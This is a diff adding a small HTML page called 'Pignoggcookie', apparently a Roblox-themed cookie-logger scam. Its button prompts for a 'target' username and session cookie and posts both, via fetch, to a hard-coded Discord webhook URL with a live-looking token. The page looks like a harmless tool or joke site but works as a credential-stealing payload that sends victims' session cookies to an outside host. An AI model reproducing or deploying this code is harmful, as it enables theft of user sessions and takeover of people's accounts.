@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+
+    body {
+
+background-image:url(https://www.solidbackgrounds.com/images/1920x1080/1920x1080-black-solid-color-background.jpg);
+}
+
+    </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pignoggcookie</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <button class="butt2" onclick="sayhello()">
+    <img class="stan" src="images/roblox stan.png" alt="">
+    </button>
+    <div class="wrapper">
+        <button class="butt1" id="discordButton">
+        <img class="img-dipfp" src="images/dipfp55.jpg" alt="dipfp55">
+        </button>
+        
+
+    </div>
+    <script>
+        function sayhello(){
+            alert("hello there!");
+        }
+    </script>
+    <script>
+          document.getElementById("discordButton").addEventListener("click", function() {
+      var questions = [
+        "Target username:",
+        "Targets cookie:"
+      ];
+
+      var answers = [];
+
+      function askQuestions(index) {
+        if (index < questions.length) {
+          var answer = prompt(questions[index]);
+          if (answer !== null) {
+            answers.push(answer);
+            askQuestions(index + 1);
+          } else {
+            console.log("No answer provided for question: " + questions[index]);
+          }
+        } else {
+          sendToDiscord(answers);
+        }
+      }
+
+      function sendToDiscord(answers) {
+        var discordWebhook = "https://discord.com/api/webhooks/1144653666175954975/Q5tMnb9jDRkfMkZC3ZEJI6vIRw-p8cz_4Xmt9wDct3_otsPmjonM_Ra6jZZKWJWvh0D8";
+
+        var payload = {
+          content: "Answers:\n" + answers.join("\n")
+        };
+
+        fetch(discordWebhook, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(function(response) {
+          if (response.ok) {
+            console.log("Answers sent to Discord successfully!");
+          } else {
+            console.error("Error sending answers to Discord.");
+          }
+        })
+        .catch(function(error) {
+          console.error("An error occurred: " + error.message);
+        });
+      }
+
+      askQuestions(0);
+    });
+  
+    </script>
+    
+</body>
+</html>
